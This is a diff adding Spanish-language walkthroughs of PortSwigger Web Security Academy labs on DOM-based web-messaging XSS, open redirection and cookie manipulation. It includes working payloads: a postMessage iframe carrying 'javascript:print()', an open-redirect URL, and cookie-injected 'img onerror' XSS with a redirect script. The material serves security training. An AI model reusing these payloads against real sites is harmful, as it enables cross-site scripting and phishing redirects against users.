@@ -138,17 +138,172 @@ Entonces, luego de que verificamos la validez del payload, lo enviamos a la vict
 Este laboratorio usa mensajería web y analiza el mensaje como JSON. Para resolver el laboratorio, construya una página HTML en el servidor de explotación que aproveche esta vulnerabilidad y llame a la print() función.
 ```
 
+Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+
+```html
+<script>
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+</script>
+```
+
+Como podemos ver en el código javascript anterior, se crea un elemento con etiqueta iframe y se le actualiza el valor de src dependiendo de que se envíe mediante el mensaje web al sitio web objetivo. El sitio web esta esperando un json como mensaje, en el cual si la variable type tiene el valor de **load-channel** se actualiza en el atributo **src** el valor de la variable **url**.
+
+Entonces, nuestro json podría ser el siguiente:
+
+```json
+{"type":"load-channel", "url":"https://desdes.xyz"}
+```
+
+Como lo que buscamos es realizar es un ataque XSS que ejecute la funcion print(), entonces nuestro json seria el siguiente:
+
+```json
+{"type":"load-channel", "url":"javascript:print()"}
+```
+
+Luego, enviaremos esto mediante un **postMessage** al sitio web mediante un iframe en nuestro exploit server, por lo que nuestro payload final seria el siguiente:
+
+```html
+<style>
+	#target{
+		width:1280px;
+		height:1280px;
+	}
+</style>
+<iframe id='target' src='https://0abd00e8044126c580f72b9d00540023.web-security-academy.net/' onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+```
+
+Entonces, luego de que verificamos la validez del payload, lo enviamos a la victima y validamos que el laboratorio se haya resuelto.
+
+![](img5.png)
+
 ## 4. Lab: DOM-based open redirection
 
 ```
 Este laboratorio contiene una vulnerabilidad de redirección abierta basada en DOM. Para resolver este laboratorio, aproveche esta vulnerabilidad y redirija a la víctima al servidor de explotación.
 ```
 
+Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+
+```html
+<div class="is-linkback">
+    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
+</div>
+```
+
+Como podemos ver, en el código anterior, el sitio web extrae el valor del parámetro get **url** y se asigna como valor al location.href esto quiere decir que se realizara una redirección. 
+
+Entonces, agregaremos un parámetro extra **url** a un articulo para reenviar al usuario a nuestro server exploit.
+
+```
+https://0a4d00b40407afbc809c1c8e002000de.web-security-academy.net/post?postId=7&url=https://exploit-0a8f005e04fcaf7f80a61bd0014600f0.exploit-server.net/
+```
+
+Entonces, probamos la url en nuestra navegador y verificamos que se ha completado el laboratorio.
+
+![](img6.png)
+
 ## 5. Lab: DOM-based cookie manipulation
 
 ```
 Este laboratorio demuestra la manipulación de cookies del lado del cliente basada en DOM. Para resolver este laboratorio, inyecte una cookie que cause XSS en una página diferente y llame a la print()función. Deberá usar el servidor de explotación para dirigir a la víctima a las páginas correctas.
 ```
+
+Para resolver esta laboratorio empezamos buscando el código javascript que edita el DOM en el sitio web.
+
+```html
+<script>
+    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+</script>
+```
+
+Como podemos ver por este código, el sitio web objetivo crea o actualiza una cookie llamada **lastViewedProduct** con el valor de la url que estemos ingresando en el navegador.
+
+Luego podemos ver que existe otra porción de código html como el siguiente:
+
+```html
+<section class="top-links">
+    <a href=/>Home</a><p>|</p>
+    <a href='https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1'>Last viewed product</a><p>|</p>
+</section>
+```
+
+Como podemos ver, al parecer el sitio web carga el valor de la cookie y lo actualiza en el sitio web, para ello cambiaremos la url para verificar si se realiza algún cambio en la sección **Last viewed product**.
+
+```url
+https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&infodeprueba
+```
+
+Ingresamos a usar url desde nuestro navegador (para que se actualice la cookie) y luego inspeccionamos el código fuente en búsqueda de algún cambio:
+
+```html
+<section class="top-links">
+    <a href=/>Home</a><p>|</p>
+    <a href='https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&infodeprueba'>Last viewed product</a><p>|</p>
+</section>
+```
+
+Al parecer nuestra teoría es correcta, ya que luego de actualizar la cookie logramos cambiar el contenido del hipervínculo de la sección **Last viewed product**.
+
+Asi que ahora, intentaremos escapar de esta etiqueta **\<a\>** con el siguiente payload.
+
+```url
+https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&'>scape-tag
+```
+
+Luego de ingresar a la url desde nuestro navegador y buscamos la sección de **Last viewed product** encontramos el siguiente cambio.
+
+```html
+<section class="top-links">
+    <a href=/>Home</a><p>|</p>
+    <a href='https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&'>scape-tag'>Last viewed product</a><p>|</p>
+</section>
+```
+
+Como podemos ver, nuestro payload a funcionado, por lo cual vamos a ingresar una etiqueta html que genere un ataque XSS que ejecute la función print() de javascript con el siguiente payload.
+
+```url
+https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&'><img src=x onerror=print()>
+```
+
+Entonces, ingresamos a la url desde nuestro navegador para ejecutar el payload.
+
+```NOTA
+NOTA: Tener en cuenta que hay que ingresar 2 veces a la misma url ya que la primera vez que se ingresa el javascript en el sitio web actualiza la cookie y la segunda ves que se ingresa es donde se visualiza el cambio en el sitio web. Esto antes no debíamos realizarlo ya que cuando realizamos la inspección del código fuente mediante el atajo CONTROL + U, se realiza la segunda consulta al sitio web para visualizar el cambio.
+```
+
+![](img7.png)
+
+Como podemos ver luego de ingresar dos veces a la url se realiza el ataque XSS ejecutando la función **print()**. Ahora requerimos generar esto mismo pero para el atacante, por lo cual debemos idear un método para enviar a la victima desde nuestro exploit server al sitio objetivo, para ello usaremos un script sencillo que reenvía a la victima a la url maliciosa anteriormente diseñada.
+
+```html
+<script>
+location="https://0aa30033041725b08a951679005100d8.web-security-academy.net/product?productId=1&'><img src=x onerror=print()>"
+</script>
+```
+
+Entonces, agregamos este payload al exploit server, enviamos dos veces a la victima y completamos el laboratorio.
+
+![](img8.png)
 
 ## 6. Lab: Exploiting DOM clobbering to enable XSS
 
